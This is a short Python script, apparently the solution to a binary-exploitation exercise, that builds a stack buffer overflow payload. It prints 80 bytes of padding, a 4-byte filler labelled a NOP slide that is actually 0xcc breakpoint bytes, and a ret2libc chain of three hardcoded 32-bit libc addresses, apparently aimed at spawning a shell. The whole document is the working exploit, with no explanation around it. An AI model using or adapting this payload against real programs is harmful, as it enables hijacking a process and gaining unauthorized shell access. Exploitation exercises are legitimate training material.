import struct

padding = 'A' * 80
nopslide = struct.pack('I', 0xcccccccc)
ret2libc = struct.pack('I', 0xb7e6b060) + struct.pack('I', 0xb7e5ebe0) + struct.pack('I', 0xb7f8cc58)

print(padding + nopslide + ret2libc)
